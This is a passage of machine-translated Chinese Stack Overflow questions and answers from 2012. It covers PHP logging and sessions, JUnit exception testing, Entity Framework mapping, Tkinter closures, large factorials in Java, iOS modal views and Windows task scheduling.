此外，“Samsung Galaxy S”不是特定设备。这是一个营销名称，已应用于全球六种或更多设备。在某些情况下（也许在这里无关紧要，但它可以）指定您正在使用的特定硬件可能会有所帮助。

其他品牌设备是否正常工作？

# php - 登录PHP的效率？

> ID：10148085
> 
> 赞同：3
> 
> 时间：2012-04-13T20:45:51.600
> 
> 标签：php, performance, logging

我正在开发一个 PHP/CodeIgniter 网络应用程序，它将成为非实时游戏的后端。我们希望能够记录游戏活动以供以后分析。在我使用 codeigniter 自己的日志系统或 log4php 进行的性能测试中，文件日志记录似乎很慢，服务器每秒可以处理的请求数减少了 50%。我在 WAMP 机器和 Apache/Ubuntu 服务器上都试过了。如果我将日志记录更改为使用 MongoDB，即使我正在记录相同数量的信息，性能也只会下降几个百分点。

php 脚本的文件日志记录本来就很慢，因为它们都在等待同一个文件的锁定，还是可能是配置问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-11T11:44:23.370

您可以尝试登录 RAM 驱动器文件。还可以考虑通过像 YYYY-mm-dd-HH.log 这样的日期戳来命名日志，这样您就可以定期获取较旧的日志并处理（存档）它们并且驱动器将保持清洁。

# eclipse - 为 Eclipse 比较合并编辑器配置选项卡空间

> ID：10148089
> 
> 赞同：1
> 
> 时间：2012-04-13T20:46:00.397
> 
> 标签：eclipse, svn, diff

有没有办法为 Eclipse 比较/合并编辑器配置选项卡空间？

我有文本编辑器为制表符使用 2 个空格和“为制表符插入空格”，但这似乎在比较/合并编辑器中不起作用。这很烦人，因为它偶尔会弄乱源代码中的缩进。我想我的另一个选择是使用外部工具，但如果可以在 Eclipse 中进行配置，那就太好了。

我正在使用 Indigo SR2（64 位）

-- 这似乎是一个相关的 Eclipse 错误： [https ://bugs.eclipse.org/bugs/show_bug.cgi?id=259410](https://bugs.eclipse.org/bugs/show_bug.cgi?id=259410)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-14T07:45:27.677

您可以选择在比较编辑器中忽略空格。要么在编辑器中右键单击并选择，`Ignore White Space`要么在 Eclipse 首选项中设置`Window`-> `Preferences`-> `General`-> `Compare/Patch`->`Ignore White Space`

# php - 在更改页面时保持会话（用户 ID）相同

> ID：10148091
> 
> 赞同：0
> 
> 时间：2012-04-13T20:46:11.300
> 
> 标签：php, mysql

我的用户在登录时有一个 user_ID，它出现在 URL 中。但是，当保存下一个表单（thesis.php）时从“myaccount.php”移动到页面时，相同的 ID 仍应位于 URL 中，因此他们输入的正确数据应位于数据库中自己的 ID 下。目前，thesis.php 页面只刷新了以下代码：

```
$err = array();
$result = mysql_query("SELECT `id` FROM `users` WHERE `banned` = '0' ORDER BY
`id`  DESC");
if(isset($_SESSION['user_id']))
if(empty($_SESSION['$user_id'])) { // user not logged in; redirect to somewhere else }
if (!empty($_POST['doThesis']) && $_POST['doThesis'] == 'Save')
{

    list($id) = mysql_fetch_row($result);

session_start();
// this sets variables in the session
$_SESSION['user_id'] = $id;
foreach($_POST as $key => $value)

$stamp = time();
$ckey = GenKey();
mysql_query("update users set `ctime`='$stamp', `ckey` = '$ckey' where id='$id'") 
or    die(mysql_error());

$row = mysql_fetch_array($result);
print_r($row);

if(empty($err)) {

$thesis_Name = mysql_real_escape_string($_POST['thesis_Name']);
$abstract = mysql_real_escape_string($_POST['abstract']);

$sql_insert = "INSERT into `thesis`
(`user_id`,`thesis_Name`,`abstract` )
VALUES
('$id','$thesis_Name','$abstract') ";

mysql_query($sql_insert,$link) or die("Insertion Failed:" . mysql_error());
}
header("Location: myaccount.php?id=' . $_SESSION[user_id] .'");
exit();

    }

    } 
```

HTML：

```
<p align="center">
<input name="doThesis" type="submit" id="doThesis" value="Save">
      </p> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-13T20:49:48.273

我相信您需要先调用 session_start()，然后才能执行 isset($_SESSION['blah'])。

尝试转移 session_start(); 到文件顶部

```
<?php
session_start();
.....
the rest of your code 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-13T20:49:58.530

session_start(); 必须在顶部；

如果您想在 URL 中传递 id var，请使用

```
<a href='myaccount.php?id=<? echo $id; ?>'> 
```

# ruby-on-rails - 在 Ruby on Rails 中路由“关注列表”

> ID：10148093
> 
> 赞同：0
> 
> 时间：2012-04-13T20:46:45.560
> 
> 标签：ruby-on-rails

我可以在浏览器中手动转到“http://localhost:3000/users/5/following”，以查看我在应用程序中关注的用户的分页列表

在我的导航栏中，我已将 <%= link_to content_tag(:li, "Watching"), user_path(@user) %> 链接，并在 URL 中获得 /users/5。

我应该在“user_path(@user)”之后添加什么 Rails 语法以定向到 /users/5/following？

我的“关注”用户控制器看起来像：

```
 def following
       @title = "Following"
       @user = User.find(params[:id])
       @users = @user.following.paginate(:page => params[:page])
       render 'show_follow'
    end 
```

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-13T20:50:20.167

我假设您是`following`路线中的成员。然后 following_user_path(user_id) 应该完成这项工作。你也可以跑去`rake routes`检查你的路线。

# jquery-mobile - Coldfusion ajax 使用 jquerymobile 返回无样式的内容

> ID：10148094
> 
> 赞同：3
> 
> 时间：2012-04-13T20:46:52.330
> 
> 标签：jquery-mobile, coldfusion

我正在关注[Ray Camdens](http://www.raymondcamden.com/index.cfm/2009/3/20/Simple-example-of-a-Form-post-to-ColdFusion-with-jQuery)关于冷融合 ajax 调用的帖子。我用jquerymobile 和themeroller 包裹了整个页面。如果我将内容放在主页上，则其样式正确，但如果我使用 ajax 返回内容，则其无样式。

![无样式](../Images/b54aa0a149750b4f9b59e033b72e855b.png)

我曾尝试在 ajax 页面中包含 jquery 和 jquerymobile 脚本，但后来我得到了奇怪的循环和双重提交按钮。在萤火虫中，我可以看到它在 ajax 返回中加载了 js 文件。我也失去了对提交按钮的关注，这在这个特定的应用程序中很重要。

![风格奇特](../Images/34c47b72ff663a19483841791ea24ecc.png)

有没有办法只在主页中链接 jquery 和 jquery mobile js 文件，然后在加载 ajax 内容后刷新样式？还是我会遇到 FOUC？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-23T04:38:53.410

固定的。使用 $("#result").html(data).trigger("create"); [如本页](http://blog.dkferguson.com/index.cfm/2011/3/15/jQuery-Mobile-styling-loaded-content)评论中所述

# java - junit 测试 - 异常的 assertEquals

> ID：10148101
> 
> 赞同：9
> 
> 时间：2012-04-13T20:47:20.660
> 
> 标签：java, exception, junit, exception-handling, junit4

如何使用 assertEquals 查看异常消息是否正确？测试通过了，但我不知道它是否遇到了正确的错误。

我正在运行的测试。

```
@Test
public void testTC3()
{
    try {
    assertEquals("Legal Values: Package Type must be P or R", Shipping.shippingCost('P', -5));
    } 
    catch (Exception e) {
    }        
} 
```

正在测试的方法。

```
public static int shippingCost(char packageType, int weight) throws Exception
{
    String e1 = "Legal Values: Package Type must be P or R";
    String e2 = "Legal Values: Weight < 0";
    int cost = 0;
        if((packageType != 'P')&&(packageType != 'R'))
        {
             throw new Exception(e1);
        }

        if(weight < 0)
        {
             throw new Exception(e2);
        }        
         if(packageType == 'P')
         {
             cost += 10;
         }
         if(weight <= 25)
         {   
             cost += 10;
         }
         else
         {
            cost += 25;
         }
         return cost;       
} 
```

}

谢谢您的帮助。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-04-13T20:49:19.693

```
try {
    assertEquals("Legal Values: Package Type must be P or R", Shipping.shippingCost('P', -5));
    Assert.fail( "Should have thrown an exception" );
} 
catch (Exception e) {
    String expectedMessage = "this is the message I expect to get";
    Assert.assertEquals( "Exception message must be correct", expectedMessage, e.getMessage() );
} 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-04-13T20:49:58.053

您示例中的 assertEquals 会将方法调用的返回值与预期值进行比较，这不是您想要的，如果发生预期的异常，当然不会有返回值。将 assertEquals 移动到 catch 块：

```
@Test
public void testTC3()
{
    try {
        Shipping.shippingCost('P', -5);
        fail(); // if we got here, no exception was thrown, which is bad
    } 
    catch (Exception e) {
        final String expected = "Legal Values: Package Type must be P or R";
        assertEquals( expected, e.getMessage());
    }        
} 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2016-03-31T09:56:42.797

> 非常适合我。

```
try{
    assertEquals("text", driver.findElement(By.cssSelector("html element")).getText());
    }catch(ComparisonFailure e){
        System.err.println("assertequals fail");
    } 
```

如果 assertEquals 失败，ComparisonFailure 将处理它

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2015-12-18T18:47:27.353

# Java 8 解决方案

这是我写的一个实用函数：

```
public final <T extends Throwable> T expectException( Class<T> exceptionClass, Runnable runnable )
{
    try
    {
        runnable.run();
    }
    catch( Throwable throwable )
    {
        if( throwable instanceof AssertionError && throwable.getCause() != null )
            throwable = throwable.getCause(); //allows "assert x != null : new IllegalArgumentException();"
        assert exceptionClass.isInstance( throwable ) : throwable; //exception of the wrong kind was thrown.
        assert throwable.getClass() == exceptionClass : throwable; //exception thrown was a subclass, but not the exact class, expected.
        @SuppressWarnings( "unchecked" )
        T result = (T)throwable;
        return result;
    }
    assert false; //expected exception was not thrown.
    return null; //to keep the compiler happy.
} 
```

（[取自我的博客](http://blog.michael.gr/2014/09/assertions-and-testing.html)）

按如下方式使用它：

```
@Test
public void testThrows()
{
    RuntimeException e = expectException( RuntimeException.class, () -> 
        {
            throw new RuntimeException( "fail!" );
        } );
    assert e.getMessage().equals( "fail!" );
} 
```

此外，如果您想了解为什么*您**不***希望`assertTrue`异常消息等于特定值的一些原因，请参阅：[https ://softwareengineering.stackexchange.com/a/278958/41811](https://softwareengineering.stackexchange.com/a/278958/41811)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2016-05-31T16:51:29.373

这是一个很好的[库](https://github.com/Codearte/catch-exception)，它允许以干净的方式断言异常。

例子：

```
// given: an empty list
List myList = new ArrayList();

// when: we try to get the first element of the list
when(myList).get(1);

// then: we expect an IndexOutOfBoundsException
then(caughtException())
        .isInstanceOf(IndexOutOfBoundsException.class)
        .hasMessage("Index: 1, Size: 0")
        .hasNoCause(); 
```

# c++ - 获取声卡的真实/物理/硬件采样率

> ID：10148102
> 
> 赞同：1
> 
> 时间：2012-04-13T20:47:22.707
> 
> 标签：c++, .net, winapi, directx, directsound

我需要获得声卡的真实/物理/硬件（不知道这个词）采样率。我正在生成高频方声波并使用 DirectSound 播放它。

我需要将 DirectSound 采样率与声卡匹配。我不希望 windows 混音器重新采样我的声音，因为输出波将完全无法使用。

简而言之：如何获得声卡原生采样率？

# c# - 实体框架存储过程结果映射

> ID：10148103
> 
> 赞同：12
> 
> 时间：2012-04-13T20:47:24.703
> 
> 标签：c#, .net, entity-framework

在过去的几天里，我一直在互联网上寻找与我的问题类似的主题。我终于求助于自己提出了这个问题。

使用代码优先方法和 EF 4.3.1，我创建了一个上下文类、实体类和用于存储存储过程输出的类。上下文类具有使用 执行某些存储过程的方法`SqlQuery<T>`。

例子：

```
public IEnumerable<Results> GetData(int id)
{
   var parameters = new SqlParameter[] { new SqlParameter("@id", id) };
   var result = this.Database.SqlQuery<Result>("Exec dbo.sproc_GetData @id",    parameters);
   var data= result.ToList<Result>();

   return data;
} 
```

当我跟踪我的调试时，我的数据回来了，并且数据被映射到具有匹配名称的属性。但是，在输出中有一个名称中带有 a 的列`"/"`（例如：`Info/Data`）。显然我不能命名这样的属性，所以我想我可以使用列属性 ( `[Column("Info/Data")]`) 映射输出：

```
[Column("Info/Data")]
public string InfoData
{
   get { return infoData; }
   set { infoData= value; }
} 
```

我什至尝试使用逐字运算符 ( )，用( )`[Column(@"Info/Data")]`包裹文本，并且都尝试了 ( )。单步执行代码时，我看到分配了具有匹配列名的属性，但具有列属性的属性在分配期间被忽略并跳过。`[]``[Column("[Info/Data]")]``[Column(@"[Info/Data]")]`

我还为实体的每一列尝试了 fluent-api。

```
 modelBuilder.ComplexType<Result>().Property(d => d.InfoData).HasColumnName("Info/Data"); 
```

但这会引发以下异常：

> 数据读取器与指定的“NameSpace.Result”不兼容。类型的成员“InfoData”在数据读取器中没有同名的对应列。

在我的项目`NameSpace.Result`中是一个类（为安全起见更改了名称），并且`InfoDatais`是我尝试使用 fluent-api 映射的属性（相应的 sql 列中包含 /；例如：Info/Data）。

有没有人遇到过这个问题？

如果我的问题不清楚或之前有人问过，请告诉我。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2014-06-12T11:49:46.780

我现在意识到这是一个老问题，但是由于 OP 最近的回答已经提出了这个问题，也许人们仍然对此感兴趣。

如果您坚持按原样使用该存储过程并且它返回的列名与 EF 不兼容，看到您传入 SQL 以直接调用 proc `SqlQuery`，您是否可以使用 INSERT-EXEC 方法执行类似声明表变量（具有更兼容的列名），将存储的过程插入到表变量中，然后从表变量中选择作为结果集？

传入 SQL 将是冗长的，所以我不是一个可口的解决方案，但作为一个思考练习，看看这是否是解决问题的方法，我认为我会提供它。

关于此类问题的好文章：http: [//www.sommarskog.se/share_data.html](http://www.sommarskog.se/share_data.html) - 大多数方法都没有帮助，因为您无法更改存储的过程（因此可能几乎无法访问db 结构或对其进行更改？），但 INSERT-EXEC 方法作为一种可能的解决方法弹出，无需更改 db 级别的任何内容......

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-15T02:39:30.770

可能无法做你想做的事。使用 Raw SQL 时，会绕过 EF 的映射部分。

[如何使用实体框架将存储过程的结果映射到具有不同命名参数的实体](https://stackoverflow.com/questions/9929113/how-to-use-entity-framework-to-map-results-of-a-stored-procedure-to-entity-with)

与 ExecuteStoreQuery 相同 [http://social.msdn.microsoft.com/Forums/pl/adonetefx/thread/d524b005-12a4-4300-a974-1e0582de876b](http://social.msdn.microsoft.com/Forums/pl/adonetefx/thread/d524b005-12a4-4300-a974-1e0582de876b)

您可以使用 ObjectQuery 获取 DbDataRecord 对象的列表。然后使用 Linq“选择”功能将结果映射到您的对象类型。如果将该映射包装在一个扩展函数中，该函数接受一个 IEnumerable 并返回一个 IEnumberable。

[从实体框架返回自定义对象 <List T> 并分配给对象数据源](https://stackoverflow.com/questions/7918071/return-custom-object-list-t-from-entity-framework-and-assign-to-object-data-so)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-06-05T17:35:25.537

回过头来思考这个问题，最简单（可能不是最干净或最好的解决方案）之一是将整个结果集包装在一个新过程中。当然，如果您有能力在不破坏任何内容的情况下修改程序，那是您最好的解决方案。但是，如果您无法修改输出，一种解决方案是使用[OPENROWSET](https://stackoverflow.com/questions/653714/how-to-select-into-temp-table-from-stored-procedure)（查看 Aaron 的答案）将过程输出抓取到表中，并选择具有新别名的每一列，该别名可以工作并遵守更清晰的编程原则。

我希望这对将来的任何人都有帮助。

*注意：*
我没有检查新版本的 EF 是否解决了这个问题。

# android - 添加日期滑块时出现问题

> ID：10148106
> 
> 赞同：2
> 
> 时间：2012-04-13T20:47:49.600
> 
> 标签：android

我正在尝试将[http://code.google.com/p/android-dateslider/](http://code.google.com/p/android-dateslider/)上提供的日期滑块用于我的 android 项目。但是我遇到了一些问题

这是一个名为 datetimeslider.xml 的布局文件

```
<?xml version="1.0" encoding="utf-8"?>
<com.googlecode.android.widgets.DateSlider.SliderContainer
    xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:app="http://schemas.android.com/apk/res/com.googlecode.android.widgets.DateSlider"
    android:id="@+id/dateSliderContainer"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent">
    <com.googlecode.android.widgets.DateSlider.ScrollLayout
        style="@style/Scroller"
        app:labelerClass="com.googlecode.android.widgets.DateSlider.labeler.MonthYearLabeler"
        app:labelerFormat="%tb %tY"
        app:childWidth="180dp"/>
    <com.googlecode.android.widgets.DateSlider.ScrollLayout
        style="@style/Scroller"
        app:labelerClass="com.googlecode.android.widgets.DateSlider.labeler.DayDateLabeler"
        app:labelerFormat="%td %ta"
        app:childWidth="120dp"/>
    <com.googlecode.android.widgets.DateSlider.ScrollLayout
        style="@style/Scroller"
        app:labelerClass="com.googlecode.android.widgets.DateSlider.labeler.TimeLabeler"
        app:labelerFormat="%tR"
        app:childWidth="80dp"/>
    <include layout="@layout/dialogbuttons"/>
</com.googlecode.android.widgets.DateSlider.SliderContainer> 
```

但是，它无法识别可用的命名空间

```
xmlns:app="http://schemas.android.com/apk/res/com.googlecode.android.widgets.DateSlider 
```

所有的属性，比如

```
app:labelerFormat="%tb %tY"
app:childWidth="180dp" 
```

他们不被android识别。为什么会这样？

# c# - 自定义 StackPanel 以使用子控件交替颜色

> ID：10148110
> 
> 赞同：0
> 
> 时间：2012-04-13T20:48:07.663
> 
> 标签：c#, .net, wpf

我有一个 StackPanel，我可以从中动态隐藏/显示项目，我想让它使每个项目的背景属性交替（白色和灰色）。我尝试以编程方式执行此操作，但效率非常低，因为每次隐藏/显示项目时都会运行设置每个项目背景的代码。我知道也许使用样式/模板可以解决这个问题，但由于某种原因，WPF 的这个特殊功能让我每次尝试学习它时都感到困惑。有人可以告诉我怎么做吗？

此外，我曾想过使用 ListBox/ListViews 而不是 StackPanel，但相信我，由于我的特殊实现，它们不能正常工作。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-13T21:05:49.753

您可以使用附加属性 ItemsControl.AlternationIndex 上的触发器对任何 ItemsControl 执行此操作（示例 - [http://dotnetbutchering.blogspot.com/2009/08/how-to-set-wpf-listview-alternate-row.html](http://dotnetbutchering.blogspot.com/2009/08/how-to-set-wpf-listview-alternate-row.html)）但我不要认为只有 StackPanel 在 xaml 中是可能的。您确定以编程方式执行它很慢吗？我很确定它会运行得足够快，因此您无需费心。

# python - Python Tkinter、lambdas 和回调

> ID：10148111
> 
> 赞同：1
> 
> 时间：2012-04-13T20:48:08.960
> 
> 标签：python, lambda, callback, scope, tkinter

Windows 7x64 Python2.7

我希望将[Python](https://stackoverflow.com/questions/233673/lexical-closures-in-python)线程解决方案中的词法闭包应用于我的代码。附加阅读[for 循环和词法环境中的闭包](https://stackoverflow.com/questions/4418326/closures-in-a-for-loop-and-lexical-environment)

我浏览了一个图像列表、缩略图对并显示缩略图，单击标签后，它应该显示一个新的 TopLevel，其中包含全尺寸图像。

实际发生的是，它只显示了 ImagePairs 的最后一个图像。环顾四周，我发现了我在上面发布的那个帖子，但我不确定如何将它应用于我的情况。

```
 row, col = 0, 0
            #create a frame for the row
            rowFrame = Frame(master)
            for image, thumb in ImagePairs:
                curLbl = Label(rowFrame, image=thumb)
                curLbl.grid(row=0, column=col, sticky='news')

                curLbl.bind('<Button-1>', lambda e:self.popImage(image))  #or curLbl.image

                col += 1
                if col >= 3:
                    rowFrame.grid(row=row)
                    #create a new frame, for the next row
                    rowFrame = Frame(master)
                    col = 0
                    row += 1 
```

我想制作一个像

```
def func(img=img):
   return img 
```

并将其插入到 grid() 和 bind() 之间的空间中，但随后出现丢失图像的错误。如何修改我的代码以适应它？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-13T20:55:54.333

您可以将默认值添加`image = image`到 lambda 本身：

```
for image, thumb in ImagePairs:
            curLbl = Label(rowFrame, image=thumb)
            curLbl.grid(row=0, column=col, sticky='news')
            curLbl.bind('<Button-1>', lambda e, image = image:self.popImage(image))  #or curLbl.image 
```

`func`如果您使用默认值而`image`不是`img`：

```
def func(e, img = image):
    self.popImage(img) 
```

* * *

要记住的关键是在定义 lambda（或函数）时绑定了默认*值*。

因此，每次通过循环时，都会使用自己的局部变量定义一个新的 lambda ，并在定义时`image`使用自己的默认值`image`绑定。因此，当稍后调用 lambda 时，将`image`访问该权限。

将其与未提供默认值的情况进行对比：`image`不再是 lambda 的局部变量。当调用 lambda 时，Python 会在封闭范围内寻找它。但到那时，for 循环完成，并且`image`在封闭范围内设置为`ImagePairs`. 这就是为什么无论你按下什么按钮，你都会得到相同的最后一张图像：所有的 lambdas 都在访问同一个变量的值`image`。

# java - 获得大量的阶乘

> ID：10148115
> 
> 赞同：0
> 
> 时间：2012-04-13T20:48:40.147
> 
> 标签：java, algorithm, math, factorial

> **可能重复：**
> [计算任意大数的阶乘，显示所有数字](https://stackoverflow.com/questions/1966077/calculate-the-factorial-of-an-arbitrarily-large-number-showing-all-the-digits)

这个问题可能会在这里被问一千次。我正在通过修改重复我的问题。我想计算一个大数的阶乘（`max range of the number=10^6`）。通常我们使用一个`for`循环 from `i=1`to`i=number`并且每次将旧值乘以新值。这对小数字很好，但如果我有大数字怎么办？`for`现在增加了循环的范围。Java 原始数据类型`int`，`long`无法处理生成的大量数据。他们只是溢出。虽然我知道`BigInteger`类，它可以处理这么大的输出，但`for`循环仍然不适合我。有人可以建议我打勾，任何计算数字阶乘的技巧吗？以下是适用于小数字的简单程序-

```
public long getFactorial(long number) {
    long factorial = 1;
    for (long i = 1; i <= number; ++i) {
        factorial *= i;
    }
    return factorial;
} 
```

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-04-13T20:57:06.003

了解该值在 10 ^(5565708)的范围内。它本身将占用大约 2 兆字节的空间。

也就是说，[Guava](https://github.com/google/guava) [`BigIntegerMath.factorial(int)`](https://google.github.io/guava/releases/snapshot-jre/api/docs/com/google/common/math/BigIntegerMath.html#factorial-int-)足以处理它，更重要的是，它实际上已经针对大型阶乘进行了优化——它会比简单的循环做得好*得多。*`for`（披露：我为 Guava 做出了贡献……并写了很多`BigIntegerMath.factorial`自己的东西。）

也就是说，我不会完全称它为快——我的基准测试表明该范围内的阶乘平均为 414 毫秒——但不会有一个真正快速的解决方案，除非没有极其重型的 bignum 库，而且我不希望那些会*明显*更快。

那就是如果您需要确切的值。如果你能满足于对数，那么是的，要么使用 Apache`logGamma(n+1)`得到`ln(n!)`，要么自己近似：

```
double logFactorial = 0;
for (int i = 2; i <= n; i++) {
  logFactorial += Math.log(i);
} 
```

一些舍入误差可能会累积，但无论如何它应该是一个近似值。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-13T20:52:50.270

对于如此大的 n 值，您可以使用称为[斯特林公式](http://en.wikipedia.org/wiki/Stirling's_approximation)的近似函数。

您可以在此处参考我的答案以获取更多详细信息： [https ://softwareengineering.stackexchange.com/questions/134968/number-of-combinations/134972#134972](https://softwareengineering.stackexchange.com/questions/134968/number-of-combinations/134972#134972)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-13T20:55:56.393

使用[**伽玛函数**](https://en.wikipedia.org/wiki/Gamma_function)。伽玛(i + 1) = i!

[org.apache.commons.math.special](https://commons.apache.org/math/)为 Java 提供了它。

人们通常做的是计算 log(Gamma(i+1)) 然后在对数空间中工作（乘法变成加法等）。

以下是一些其他快速计算阶乘的方法：[http ://www.luschny.de/math/factorial/FastFactorialFunctions.htm](http://www.luschny.de/math/factorial/FastFactorialFunctions.htm)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-13T20:53:03.980

你使用`BigInteger`for `factorial`，你仍然只需要一个`long`for`i`循环变量。 `i`只需要达到1000000。有什么问题？

# ios - 取消一个视图会使它失去所有的价值...... viewWillAppear 作为一种治疗方法？

> ID：10148118
> 
> 赞同：0
> 
> 时间：2012-04-13T20:48:45.823
> 
> 标签：ios, variables, modalviewcontroller, dismiss

我有一个基本的模态视图系统。

我的应用程序加载 UI 基础，其中有 2 个按钮呈现 2 个其他视图。在这些视图中，有一个关闭按钮。

一切正常。

但是，在 2 个模态视图之一中，我有一堆 UISlider 和 UISwitch。我希望它们保留它们的值，但解雇会丢失它们：一旦我触发按钮以显示包含 UI 元素的视图，该视图就会显示所有元素的所有值，就像我最初放在 xib 中一样。

我应该将所有值存储在变量中，然后在 viewWillAppear 中我可以“召回”它们吗？

你会建议我另一种策略吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-13T21:26:59.487

当您创建模态视图时，您正在创建 modalViewController 和 modalView 的新实例。这个新实例对任何其他实例一无所知。有几种方法可以保留这些模态视图控制器先前迭代的信息。

我会怎么做：在主视图中设置占位符，并通过协议和委托设置将用户选择的值传递回主视图。然后，当您转到模态视图时，您可以在显示模态视图之前加载这些变量。

所以假设你有一个包含所有值的字典： {slider = YES, someValue=10,...} 在主视图控制器中创建该字典，第一个打开的，并在其中放置一些默认值。

在您的模态视图控制器中，创建与属性相同的字典。

在您的模态视图控制器中创建一个协议，其方法类似于

`- (void) doneEditing:(NSDictionary *)values`

将您的第一个视图设置为模态视图控制器的委托，并在`doneEditing`弹出模态视图之前将值复制到第一个视图中存在的字典中。

当第一个视图准备好再次呈现模态视图时，在呈现它之前将值复制到模态视图的字典属性。

我希望这能让你朝着正确的方向前进。重要的是要记住，每次你 segue 或创建并呈现一个模态视图时，你正在创建该视图的全新实例，除非你告诉它一些关于它的信息，否则它对前一个实例一无所知。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-13T21:37:00.997

是的，您提出的方法是完全正确的。不过要小心; 可以调用 viewWillAppear 的原因有很多；确保仅在视图控制器出现并首次显示视图时才执行此操作。

NSUserDefaults 可以是存储全球所需信息的好地方。在 viewWillDisappear 中，将所需的状态信息（滑块和开关的值）存储在默认值中。然后在下次视图即将出现时检索它们。

# xml - 如何从“BUILTIN/Administrators”或 0x01020000000000052000000020020000 中生成 AQIAAAAAAAUgAAAAIAIAAA==

> ID：10148121
> 
> 赞同：0
> 
> 时间：2012-04-13T20:49:18.057
> 
> 标签：xml, reporting-services, active-directory, ssrs-2008, windows-authentication

我正在使用 ReportServer.dbo.SetPolicy 存储过程自动向 SSRS 用户授予权限，并且我坚持更新包含以下内容的 @XmlPolicy 字段：

@XmlPolicy = 'BUILTIN\AdministratorsAQIAAAAAAAUgAAAAIAIAAA== 内容管理器'

上面的 GroupUserId 显然是 BUILTIN\Administrators 帐户的 SID，即 0x01020000000000052000000020020000。

问题是如何将 0x01020000000000052000000020020000 转换（编码）为 AQIAAAAAAAUgAAAAIAIAAA== 格式？

还是有更好的方法来做到这一点？谢谢你。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-13T20:55:05.600

" `AQIAAAAAAAUgAAAAIAIAAA==`" 只是用[Base64](http://en.wikipedia.org/wiki/Base64)`01 02 00 00 00 00 00 05 20 00 00 00 20 02 00 00`编码的二进制字符串。

# c# - 计划计时器每月执行一次 - C#

> ID：10148124
> 
> 赞同：0
> 
> 时间：2012-04-13T20:49:23.810
> 
> 标签：c#, timer, scheduled-tasks, scheduling, scheduler

我需要每月一次将一些数据从 SQL Server 传输到 MySQL。我已经完成了这个转移的工作，但我不知道（而且我还没有在互联网上找到）如何设置一个计时器来执行这个转移每个月的特定日期。我不想只是以毫秒为单位设置计时器间隔，因为天数因一个月而异。

任何帮助表示赞赏...

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-04-13T20:51:43.553

这听起来像是您应该将其设置为计划任务或 SQL 服务器作业，而不是通过计时器让进程运行一个月？

链接：

*   [2008 年的 SQL Server 工作](http://msdn.microsoft.com/en-us/library/ms190268%28v=sql.100%29.aspx)
*   [安排windows任务](http://www.windowsnetworking.com/articles_tutorials/Working-Windows-Server-2008-Task-Scheduler-Part1.html)

我想您也可以将任务设置为 Windows 服务，并通过数据库中的设置检查您上次进行更新的时间，但这似乎有点矫枉过正。从它的声音来看，您已经有一个可以完成这项工作的 C# 应用程序设置，所以我只需执行一个计划的 Windows 任务。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-13T20:56:58.707

您可以使用 Windows 任务计划程序来完成此类工作。[在此处](http://technet.microsoft.com/en-us/library/cc772785%28v=ws.10%29.aspx)查找命令行选项`Schtasks`（有很多）

示例 1：

> 安排在每个月的第一天运行的任务
> 
> 以下命令安排 MyApp 程序在每个月的第一天运行。因为值 1 是 /mo（修饰符）参数和 /d（天）参数的默认值，所以从命令中省略了这些参数。

```
schtasks /create /tn "My App" /tr myapp.exe /sc monthly 
```

示例 2：

> 安排第 15 天的任务
> 
> 以下命令安排 MyApp 程序在每月 15 日下午 3:00 (15:00) 运行。它使用 /d 参数来指定日期。它还使用 /st 参数来指定开始时间。

```
schtasks /create /tn "My App" /tr myapp.exe /sc monthly /d 15 /st 15:00 
```

# c# - 收货时更新库存表

> ID：10148127
> 
> 赞同：0
> 
> 时间：2012-04-13T20:49:27.030
> 
> 标签：c#, sql

我有三张表 Good Receive header ，Good Receive Details table 和 stock Table

```
 TB_GoodsReceive_HDR  - Header Table
  ID  SupplierID
  1     1

  TB_GoodsReceive_DTL - Details Table
   ID  GR_HDR_ID       ItemID   WarehouseID   ExpiryDate    Qty
   1      1               1       1     4/4/2012     20
   2      1               2       1     4/4/2012     30

   TB_Stock - Stock Table
   ID ItemID  WarehouseID   ExpiryDate  StockType  GR_HDR_ID    Qty
   1   1           1    4/4/2012       R       1        20
   1   2           1    4/4/2012       R       1        30 
```

我收到了项目 1 – 20 数量和项目 2 – 30 数量。我的股票表里也有。有很多场景，但我需要这个场景的指南

现在当用户更新 TB_GoodsReceive_DTL 如下：仅更新项目（ItemID 1 到 ItemID 3）

```
 ID GR_HDR_ID   ItemID    WarehouseID ExpiryDate    Qty
       1   1          **3**      1      4/4/2012     20
       2   1            2        1      4/4/2012     30

      My stock table values should be as follows: 

      ID  ItemID  WarehouseID ExpiryDate StockType  GR_HDR_ID    Qty
      1    **3**        1     4/4/2012       R        1      20
      1    2            1     4/4/2012       R        1      30 
```

但是我下面的存储过程会插入新行，而不是更新库存主数据中的行。同样，用户可能会更新仓库或到期日期

以下过程执行以下操作：

每当收到货物时，它会检查库存表中的itemid，仓库和到期日，如果存在，它将添加数量，否则它将在库存表中插入新项目。

问题是每当更新 Good Receive 表时（意味着当用户更新 ItemId 或 Expiry Date 或 Warehouse 时）如何更新 stock 表。请各位大神帮帮忙，我的头都破了……

```
 Declare     
    @ItemID int,
    @WareHouseID int,
    @Qty int,
    @StockType nvarchar(30),
    @ExpiryDate datetime,

